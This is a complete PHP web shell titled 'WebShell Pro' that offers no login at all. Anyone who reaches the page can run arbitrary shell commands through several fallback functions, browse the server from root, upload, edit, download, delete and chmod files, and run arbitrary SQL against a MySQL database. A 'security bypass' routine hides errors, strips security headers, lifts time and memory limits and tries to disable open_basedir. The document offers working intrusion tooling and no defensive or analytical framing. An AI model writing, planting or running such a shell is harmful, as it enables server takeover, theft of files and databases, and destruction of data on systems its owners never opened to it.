<?php
// =====================================================
// 🔥 WEBSHELL PRO - FULL FUNCTIONALITY VERSION
// =====================================================

// Disable all errors and warnings
error_reporting(0);
@ini_set('display_errors', 0);

// Start session
if (session_status() == PHP_SESSION_NONE) {
    @session_start();
}

// =====[ SECURITY BYPASS ]=====
function bypassAll() {
    // Remove security headers
    @header_remove('X-Powered-By');
    @header_remove('Server');
    @header_remove('X-Frame-Options');
    
    // Set custom headers
    @header('Content-Type: text/html; charset=utf-8');
    @header('Cache-Control: no-store, no-cache, must-revalidate');
    
    // Bypass restrictions
    @ini_set('memory_limit', '-1');
    @ini_set('max_execution_time', '0');
    @set_time_limit(0);
    @ignore_user_abort(true);
    
    // Bypass open_basedir
    if (@ini_get('open_basedir')) {
        @ini_set('open_basedir', 'none');
    }
}

bypassAll();

// =====[ GLOBAL VARIABLES ]=====
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(__DIR__);
if (!$currentDir || !is_dir($currentDir)) {
    $currentDir = realpath(__DIR__);
}

// =====[ DELETE FUNCTION - WORKING ]=====
function deleteRecursive($path) {
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    
    if (!is_dir($path)) {
        return false;
    }
    
    $success = true;
    $items = @scandir($path);
    
    if ($items === false) {
        return false;
    }
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($fullPath)) {
            if (!deleteRecursive($fullPath)) {
                $success = false;
            }
        } else {
            if (!@unlink($fullPath)) {
                $success = false;
            }
        }
    }
    
    return @rmdir($path) && $success;
}

// =====[ CHMOD FUNCTION - WORKING ]=====
function chmodRecursive($path, $mode) {
    if (is_file($path) || is_link($path)) {
        return @chmod($path, $mode);
    }
    
    if (!is_dir($path)) {
        return false;
    }
    
    $success = @chmod($path, $mode);
    $items = @scandir($path);
    
    if ($items === false) {
        return false;
    }
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        chmodRecursive($fullPath, $mode);
    }
    
    return $success;
}

// =====[ COMMAND EXECUTION - WORKING ]=====
function executeCommand($command) {
    $output = "";
    
    // Try multiple execution methods
    $methods = [
        'shell_exec',
        'system',
        'passthru',
        'exec',
        'popen',
        'proc_open'
    ];
    
    foreach ($methods as $method) {
        if (function_exists($method)) {
            switch ($method) {
                case 'shell_exec':
                    $output = @shell_exec($command);
                    break;
                    
                case 'system':
                    @ob_start();
                    @system($command);
                    $output = @ob_get_clean();
                    break;
                    
                case 'passthru':
                    @ob_start();
                    @passthru($command);
                    $output = @ob_get_clean();
                    break;
                    
                case 'exec':
                    @exec($command, $outputArray, $returnCode);
                    $output = implode("\n", $outputArray);
                    if ($returnCode != 0) $output .= "\nReturn code: $returnCode";
                    break;
                    
                case 'popen':
                    $handle = @popen($command, 'r');
                    if (is_resource($handle)) {
                        $output = '';
                        while (!feof($handle)) {
                            $output .= fread($handle, 4096);
                        }
                        pclose($handle);
                    }
                    break;
                    
                case 'proc_open':
                    $descriptors = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    
                    $process = @proc_open($command, $descriptors, $pipes);
                    if (is_resource($process)) {
                        fclose($pipes[0]);
                        $output = stream_get_contents($pipes[1]);
                        $error = stream_get_contents($pipes[2]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        
                        if (!empty($error)) {
                            $output .= "\nError: " . $error;
                        }
                    }
                    break;
            }
            
            if (!empty($output)) {
                break;
            }
        }
    }
    
    // Last resort: backticks
    if (empty($output)) {
        $output = `$command`;
    }
    
    return $output ?: "Command executed (no output)";
}

// =====[ DATABASE CONNECTION - WORKING ]=====
function connectDatabase($host, $user, $pass, $dbname = '') {
    try {
        $dsn = "mysql:host=" . $host;
        if (!empty($dbname)) {
            $dsn .= ";dbname=" . $dbname;
        }
        
        $options = [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ];
        
        return new PDO($dsn, $user, $pass, $options);
    } catch (Exception $e) {
        return false;
    }
}

// =====[ HANDLE POST REQUESTS ]=====
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    
    // Command Execution
    if (isset($_POST['cmd'])) {
        echo executeCommand($_POST['cmd']);
        exit;
    }
    
    // Database Query
    if (isset($_POST['db_query'])) {
        $host = $_POST['db_host'] ?? 'localhost';
        $user = $_POST['db_user'] ?? 'root';
        $pass = $_POST['db_pass'] ?? '';
        $dbname = $_POST['db_name'] ?? '';
        $query = $_POST['db_query'] ?? 'SHOW DATABASES';
        
        $pdo = connectDatabase($host, $user, $pass, $dbname);
        if ($pdo) {
            try {
                $stmt = $pdo->query($query);
                $results = $stmt->fetchAll();
                
                if (empty($results)) {
                    echo "Query executed successfully (no results)";
                } else {
                    echo "<pre>";
                    print_r($results);
                    echo "</pre>";
                }
            } catch (Exception $e) {
                echo "Error: " . $e->getMessage();
            }
        } else {
            echo "Database connection failed";
        }
        exit;
    }
    
    // File Upload
    if (isset($_FILES['upload_file'])) {
        $targetDir = $_POST['upload_dir'] ?? $currentDir;
        $filename = basename($_FILES['upload_file']['name']);
        $targetFile = rtrim($targetDir, '/') . '/' . $filename;
        
        if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
            $_SESSION['message'] = "✅ File uploaded: " . $filename;
        } elseif (@copy($_FILES['upload_file']['tmp_name'], $targetFile)) {
            $_SESSION['message'] = "✅ File copied: " . $filename;
        } else {
            $_SESSION['message'] = "❌ Upload failed";
        }
        
        header("Location: ?dir=" . urlencode($currentDir));
        exit;
    }
    
    // File Operations
    if (isset($_POST['file_action'])) {
        $action = $_POST['file_action'];
        $path = $_POST['file_path'] ?? '';
        $result = false;
        
        switch ($action) {
            case 'delete':
                $result = deleteRecursive($path);
                break;
                
            case 'rename':
                $newPath = $_POST['new_path'] ?? '';
                if ($newPath) {
                    $result = @rename($path, $newPath);
                }
                break;
                
            case 'chmod':
                $mode = $_POST['chmod_mode'] ?? '0644';
                $result = chmodRecursive($path, octdec($mode));
                break;
                
            case 'create_file':
                $result = @file_put_contents($path, '') !== false;
                break;
                
            case 'create_dir':
                $result = @mkdir($path, 0755, true);
                break;
                
            case 'edit':
                $content = $_POST['file_content'] ?? '';
                $result = @file_put_contents($path, $content) !== false;
                break;
        }
        
        echo $result ? "✅ Operation successful" : "❌ Operation failed";
        exit;
    }
}

// =====[ HANDLE GET REQUESTS ]=====
// File Download
if (isset($_GET['download'])) {
    $file = realpath($currentDir . '/' . $_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        @readfile($file);
        exit;
    }
}

// File View
if (isset($_GET['view'])) {
    $file = realpath($currentDir . '/' . $_GET['view']);
    if ($file && is_file($file)) {
        $content = @file_get_contents($file);
        echo "<pre>" . htmlspecialchars($content) . "</pre>";
        exit;
    }
}

// =====[ GET DIRECTORY LISTING ]=====
$items = @scandir($currentDir) ?: [];
$dirItems = [];
$fileItems = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
    $isDir = @is_dir($fullPath);
    
    $fileInfo = [
        'name' => $item,
        'path' => $fullPath,
        'is_dir' => $isDir,
        'size' => $isDir ? '-' : @filesize($fullPath),
        'perms' => substr(sprintf('%o', @fileperms($fullPath)), -4),
        'modified' => @date('Y-m-d H:i:s', @filemtime($fullPath)),
        'owner' => @fileowner($fullPath),
        'group' => @filegroup($fullPath),
        'readable' => @is_readable($fullPath),
        'writable' => @is_writable($fullPath),
        'executable' => @is_executable($fullPath)
    ];
    
    if ($isDir) {
        $dirItems[] = $fileInfo;
    } else {
        $fileItems[] = $fileInfo;
    }
}

// Sort items
usort($dirItems, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

usort($fileItems, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

$allItems = array_merge($dirItems, $fileItems);

// Message from session
$message = $_SESSION['message'] ?? '';
unset($_SESSION['message']);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔧 WebShell Pro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: #111; 
            color: #0f0; 
            padding: 15px;
            font-size: 14px;
        }
        .container { max-width: 100%; }
        
        /* Header */
        .header { 
            background: #222; 
            padding: 15px; 
            border: 1px solid #0f0;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .header h1 { 
            color: #0f0; 
            margin-bottom: 10px;
            font-size: 20px;
        }
        .path-info { 
            background: #000; 
            padding: 8px; 
            border-radius: 3px;
            margin: 10px 0;
            font-family: monospace;
            border: 1px solid #333;
        }
        
        /* Tabs */
        .tabs { 
            display: flex; 
            flex-wrap: wrap; 
            gap: 5px; 
            margin-bottom: 15px;
            border-bottom: 2px solid #0f0;
            padding-bottom: 10px;
        }
        .tab { 
            background: #222; 
            padding: 8px 15px; 
            cursor: pointer; 
            border: 1px solid #333;
            border-radius: 3px;
            font-size: 13px;
        }
        .tab:hover { border-color: #0f0; }
        .tab.active { 
            background: #0f0; 
            color: #000; 
            font-weight: bold;
            border-color: #0f0;
        }
        
        /* Panels */
        .panel { 
            display: none; 
            background: #222; 
            padding: 15px; 
            border: 1px solid #0f0;
            border-radius: 5px;
            margin-top: 15px;
        }
        .panel.active { display: block; }
        
        /* File Table */
        .file-table { 
            width: 100%; 
            border-collapse: collapse;
            margin-top: 10px;
        }
        .file-table th, .file-table td { 
            padding: 8px 10px; 
            text-align: left; 
            border-bottom: 1px solid #333;
            font-size: 13px;
        }
        .file-table th { 
            background: #000; 
            font-weight: bold;
            position: sticky;
            top: 0;
        }
        .file-table tr:hover { background: #333; }
        
        /* Buttons */
        .btn { 
            background: #0f0; 
            color: #000; 
            padding: 6px 12px; 
            border: none; 
            border-radius: 3px; 
            cursor: pointer; 
            font-weight: bold;
            font-family: monospace;
            font-size: 12px;
            text-decoration: none;
            display: inline-block;
            margin: 2px;
            border: 1px solid #0f0;
        }
        .btn:hover { background: #0c0; }
        .btn-small { padding: 4px 8px; font-size: 11px; }
        .btn-red { background: #f00; color: white; border-color: #f00; }
        .btn-red:hover { background: #c00; }
        .btn-blue { background: #06c; color: white; border-color: #06c; }
        .btn-yellow { background: #fc0; color: #000; border-color: #fc0; }
        
        /* Forms */
        .form-group { margin-bottom: 10px; }
        .form-group label { display: block; margin-bottom: 3px; color: #0f0; font-size: 13px; }
        .form-control { 
            width: 100%; 
            padding: 8px; 
            background: #000; 
            color: #0f0; 
            border: 1px solid #333; 
            border-radius: 3px;
            font-family: monospace;
            font-size: 13px;
        }
        .form-control:focus { 
            outline: none; 
            border-color: #0f0;
        }
        
        /* Output */
        .output { 
            background: #000; 
            padding: 10px; 
            border-radius: 3px; 
            margin-top: 10px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-family: monospace;
            border: 1px solid #333;
            font-size: 12px;
        }
        
        /* Quick Actions */
        .quick-actions { 
            display: flex; 
            flex-wrap: wrap; 
            gap: 5px; 
            margin: 10px 0;
        }
        
        /* Message */
        .message { 
            padding: 8px; 
            margin: 10px 0; 
            border-radius: 3px;
            border: 1px solid;
        }
        .success { background: #0f0; color: #000; border-color: #0f0; }
        .error { background: #f00; color: #fff; border-color: #f00; }
        
        /* Icons */
        .icon-folder { color: #fc0; }
        .icon-file { color: #0cf; }
        
        /* Context Menu */
        .context-menu {
            position: absolute;
            background: #222;
            border: 1px solid #0f0;
            border-radius: 3px;
            padding: 5px 0;
            display: none;
            z-index: 1000;
        }
        .context-menu-item {
            padding: 5px 15px;
            cursor: pointer;
            font-size: 12px;
        }
        .context-menu-item:hover {
            background: #0f0;
            color: #000;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>🔧 WebShell Pro</h1>
            <div class="path-info">
                📁 <strong>Path:</strong> <?php echo htmlspecialchars($currentDir); ?>
            </div>
            
            <?php if ($message): ?>
                <div class="message <?php echo strpos($message, '✅') !== false ? 'success' : 'error'; ?>">
                    <?php echo htmlspecialchars($message); ?>
                </div>
            <?php endif; ?>
            
            <div class="quick-actions">
                <a href="?dir=<?php echo urlencode(dirname($currentDir)); ?>" class="btn">⬆️ Parent</a>
                <a href="?dir=/" class="btn">🏠 Root</a>
                <a href="?dir=<?php echo urlencode($currentDir); ?>" class="btn">🔄 Refresh</a>
                <button onclick="showPanel('cmd')" class="btn">⚡ Terminal</button>
                <button onclick="showPanel('upload')" class="btn">📤 Upload</button>
                <button onclick="showPanel('new')" class="btn">➕ New</button>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" onclick="showPanel('files')">📁 Files</div>
            <div class="tab" onclick="showPanel('cmd')">⚡ Terminal</div>
            <div class="tab" onclick="showPanel('upload')">📤 Upload</div>
            <div class="tab" onclick="showPanel('new')">➕ Create</div>
            <div class="tab" onclick="showPanel('db')">🗄️ Database</div>
        </div>

        <!-- File Manager -->
        <div id="files" class="panel active">
            <h3>📁 File Manager</h3>
            
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($allItems as $item): ?>
                    <tr oncontextmenu="showContextMenu(event, '<?php echo urlencode($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')">
                        <td>
                            <?php if ($item['is_dir']): ?>
                                <span class="icon-folder">📁</span>
                                <a href="?dir=<?php echo urlencode($item['path']); ?>" style="color: #fc0;">
                                    <?php echo htmlspecialchars($item['name']); ?>
                                </a>
                            <?php else: ?>
                                <span class="icon-file">📄</span>
                                <?php echo htmlspecialchars($item['name']); ?>
                            <?php endif; ?>
                        </td>
                        <td>
                            <?php echo $item['is_dir'] ? '-' : formatSize($item['size']); ?>
                        </td>
                        <td>
                            <code><?php echo $item['perms']; ?></code>
                            <?php if (!$item['writable']): ?> <span title="Not writable">🔒</span> <?php endif; ?>
                        </td>
                        <td><?php echo $item['modified']; ?></td>
                        <td>
                            <div style="display: flex; flex-wrap: wrap; gap: 2px;">
                                <?php if (!$item['is_dir']): ?>
                                    <a href="?dir=<?php echo urlencode($currentDir); ?>&view=<?php echo urlencode($item['name']); ?>" 
                                       target="_blank" class="btn btn-small btn-blue">View</a>
                                    <button onclick="editFile('<?php echo urlencode($item['path']); ?>')" 
                                            class="btn btn-small">Edit</button>
                                    <a href="?dir=<?php echo urlencode($currentDir); ?>&download=<?php echo urlencode($item['name']); ?>" 
                                       class="btn btn-small btn-yellow">Download</a>
                                <?php endif; ?>
                                <button onclick="renameItem('<?php echo urlencode($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" 
                                        class="btn btn-small">Rename</button>
                                <button onclick="chmodItem('<?php echo urlencode($item['path']); ?>', '<?php echo $item['perms']; ?>')" 
                                        class="btn btn-small">Chmod</button>
                                <button onclick="deleteItem('<?php echo urlencode($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" 
                                        class="btn btn-small btn-red">Delete</button>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Terminal -->
        <div id="cmd" class="panel">
            <h3>⚡ Terminal</h3>
            <div class="form-group">
                <input type="text" id="command" class="form-control" 
                       placeholder="Enter command (whoami, id, pwd, ls -la, etc)" 
                       onkeydown="if(event.keyCode===13) executeCommand()">
            </div>
            <button onclick="executeCommand()" class="btn">Execute</button>
            <button onclick="document.getElementById('command-output').innerHTML = ''" class="btn btn-red">Clear</button>
            
            <div class="quick-actions">
                <button onclick="quickCommand('whoami')" class="btn btn-small">whoami</button>
                <button onclick="quickCommand('id')" class="btn btn-small">id</button>
                <button onclick="quickCommand('pwd')" class="btn btn-small">pwd</button>
                <button onclick="quickCommand('ls -la')" class="btn btn-small">ls -la</button>
                <button onclick="quickCommand('uname -a')" class="btn btn-small">uname -a</button>
                <button onclick="quickCommand('ps aux')" class="btn btn-small">ps aux</button>
                <button onclick="quickCommand('netstat -tulpn')" class="btn btn-small">netstat</button>
                <button onclick="quickCommand('df -h')" class="btn btn-small">df -h</button>
            </div>
            
            <div id="command-output" class="output"></div>
        </div>

        <!-- Upload -->
        <div id="upload" class="panel">
            <h3>📤 File Upload</h3>
            <form id="upload-form" method="post" enctype="multipart/form-data" onsubmit="uploadFile(this); return false;">
                <input type="hidden" name="upload_dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                
                <div class="form-group">
                    <label>Select File:</label>
                    <input type="file" name="upload_file" class="form-control" required>
                </div>
                
                <div class="form-group">
                    <label>Upload Path:</label>
                    <input type="text" name="custom_path" class="form-control" 
                           value="<?php echo htmlspecialchars($currentDir); ?>">
                </div>
                
                <button type="submit" class="btn">Upload File</button>
            </form>
            <div id="upload-result" class="output"></div>
        </div>

        <!-- Create New -->
        <div id="new" class="panel">
            <h3>➕ Create New</h3>
            
            <div class="form-group">
                <label>Create File:</label>
                <div style="display: flex; gap: 5px;">
                    <input type="text" id="new_filename" class="form-control" placeholder="filename.txt">
                    <button onclick="createFile()" class="btn">Create File</button>
                </div>
            </div>
            
            <div class="form-group">
                <label>Create Directory:</label>
                <div style="display: flex; gap: 5px;">
                    <input type="text" id="new_dirname" class="form-control" placeholder="dirname">
                    <button onclick="createDirectory()" class="btn">Create Directory</button>
                </div>
            </div>
            
            <div class="form-group">
                <label>Edit File:</label>
                <input type="text" id="edit_filepath" class="form-control" 
                       placeholder="<?php echo htmlspecialchars($currentDir); ?>/filename.txt">
                <textarea id="edit_content" class="form-control" rows="10" placeholder="File content"></textarea>
                <button onclick="saveFile()" class="btn">Save File</button>
            </div>
        </div>

        <!-- Database -->
        <div id="db" class="panel">
            <h3>🗄️ Database Manager</h3>
            <form onsubmit="executeDbQuery(this); return false;">
                <div class="form-group">
                    <label>Host:</label>
                    <input type="text" name="db_host" class="form-control" value="localhost">
                </div>
                
                <div class="form-group">
                    <label>Username:</label>
                    <input type="text" name="db_user" class="form-control" value="root">
                </div>
                
                <div class="form-group">
                    <label>Password:</label>
                    <input type="password" name="db_pass" class="form-control">
                </div>
                
                <div class="form-group">
                    <label>Database (optional):</label>
                    <input type="text" name="db_name" class="form-control">
                </div>
                
                <div class="form-group">
                    <label>SQL Query:</label>
                    <textarea name="db_query" class="form-control" rows="4">SHOW DATABASES;</textarea>
                </div>
                
                <button type="submit" class="btn">Execute Query</button>
            </form>
            
            <div class="quick-actions">
                <button onclick="setQuery('SHOW DATABASES;')" class="btn btn-small">SHOW DATABASES</button>
                <button onclick="setQuery('SHOW TABLES;')" class="btn btn-small">SHOW TABLES</button>
                <button onclick="setQuery('SELECT * FROM users LIMIT 10;')" class="btn btn-small">SELECT users</button>
            </div>
            
            <div id="db-result" class="output"></div>
        </div>
    </div>

    <!-- Context Menu -->
    <div id="context-menu" class="context-menu"></div>

    <!-- JavaScript -->
    <script>
        // Tab switching
        function showPanel(panelId) {
            document.querySelectorAll('.panel').forEach(panel => {
                panel.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.getElementById(panelId).classList.add('active');
            event.target.classList.add('active');
        }

        // Command execution
        function executeCommand() {
            const cmd = document.getElementById('command').value;
            const output = document.getElementById('command-output');
            
            if (!cmd.trim()) {
                alert('Please enter a command');
                return;
            }
            
            output.innerHTML = 'Executing...\n';
            
            const formData = new FormData();
            formData.append('cmd', cmd);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                output.innerHTML += result;
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                output.innerHTML += 'Error: ' + error;
            });
        }

        function quickCommand(cmd) {
            document.getElementById('command').value = cmd;
            executeCommand();
        }

        // File operations
        function deleteItem(path, name) {
            if (!confirm('Delete "' + name + '"?')) {
                return;
            }
            
            const formData = new FormData();
            formData.append('file_action', 'delete');
            formData.append('file_path', decodeURIComponent(path));
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }

        function renameItem(path, name) {
            const newName = prompt('Enter new name:', name);
            if (!newName || newName === name) return;
            
            const oldPath = decodeURIComponent(path);
            const newPath = oldPath.substring(0, oldPath.lastIndexOf('/') + 1) + newName;
            
            const formData = new FormData();
            formData.append('file_action', 'rename');
            formData.append('file_path', oldPath);
            formData.append('new_path', newPath);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            });
        }

        function chmodItem(path, currentPerms) {
            const newPerms = prompt('Enter new permissions (e.g., 0755, 0644):', currentPerms);
            if (!newPerms) return;
            
            const formData = new FormData();
            formData.append('file_action', 'chmod');
            formData.append('file_path', decodeURIComponent(path));
            formData.append('chmod_mode', newPerms);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            });
        }

        function editFile(path) {
            const filePath = decodeURIComponent(path);
            const content = prompt('Enter new content for ' + filePath + ':', '');
            if (content === null) return;
            
            const formData = new FormData();
            formData.append('file_action', 'edit');
            formData.append('file_path', filePath);
            formData.append('file_content', content);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            });
        }

        // File upload
        function uploadFile(form) {
            const resultDiv = document.getElementById('upload-result');
            resultDiv.innerHTML = 'Uploading...';
            
            const formData = new FormData(form);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(() => {
                resultDiv.innerHTML = 'Upload completed! Reloading...';
                setTimeout(() => location.reload(), 1000);
            })
            .catch(error => {
                resultDiv.innerHTML = 'Upload failed: ' + error;
            });
        }

        // Create new files/directories
        function createFile() {
            const filename = document.getElementById('new_filename').value;
            if (!filename) {
                alert('Please enter a filename');
                return;
            }
            
            const path = '<?php echo $currentDir; ?>/' + filename;
            
            const formData = new FormData();
            formData.append('file_action', 'create_file');
            formData.append('file_path', path);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            });
        }

        function createDirectory() {
            const dirname = document.getElementById('new_dirname').value;
            if (!dirname) {
                alert('Please enter a directory name');
                return;
            }
            
            const path = '<?php echo $currentDir; ?>/' + dirname;
            
            const formData = new FormData();
            formData.append('file_action', 'create_dir');
            formData.append('file_path', path);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                location.reload();
            });
        }

        function saveFile() {
            const filepath = document.getElementById('edit_filepath').value;
            const content = document.getElementById('edit_content').value;
            
            if (!filepath) {
                alert('Please enter a file path');
                return;
            }
            
            const formData = new FormData();
            formData.append('file_action', 'edit');
            formData.append('file_path', filepath);
            formData.append('file_content', content);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
            });
        }

        // Database operations
        function executeDbQuery(form) {
            const resultDiv = document.getElementById('db-result');
            resultDiv.innerHTML = 'Executing query...';
            
            const formData = new FormData(form);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                resultDiv.innerHTML = result;
            })
            .catch(error => {
                resultDiv.innerHTML = 'Error: ' + error;
            });
        }

        function setQuery(query) {
            document.querySelector('textarea[name="db_query"]').value = query;
        }

        // Context menu
        function showContextMenu(event, path, name) {
            event.preventDefault();
            
            const menu = document.getElementById('context-menu');
            menu.innerHTML = `
                <div class="context-menu-item" onclick="downloadItem('${name}')">📥 Download</div>
                <div class="context-menu-item" onclick="renameItem('${path}', '${name}')">✏️ Rename</div>
                <div class="context-menu-item" onclick="chmodItem('${path}', '0644')">🔧 Chmod</div>
                <div class="context-menu-item" onclick="deleteItem('${path}', '${name}')" style="color: #f00;">🗑️ Delete</div>
            `;
            
            menu.style.left = event.pageX + 'px';
            menu.style.top = event.pageY + 'px';
            menu.style.display = 'block';
            
            // Hide menu when clicking elsewhere
            document.addEventListener('click', function hideMenu() {
                menu.style.display = 'none';
                document.removeEventListener('click', hideMenu);
            });
        }

        function downloadItem(name) {
            window.location.href = '?dir=<?php echo urlencode($currentDir); ?>&download=' + encodeURIComponent(name);
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Ctrl+K for terminal
            if (e.ctrlKey && e.key === 'k') {
                e.preventDefault();
                showPanel('cmd');
                document.getElementById('command').focus();
            }
            // Ctrl+U for upload
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                showPanel('upload');
            }
            // F5 to refresh
            if (e.key === 'F5') {
                location.reload();
            }
        });
    </script>
</body>
</html>

<?php
// Helper function for file size formatting
function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}

// Display PHP info if requested
if (isset($_GET['phpinfo'])) {
    phpinfo();
    exit;
}
?>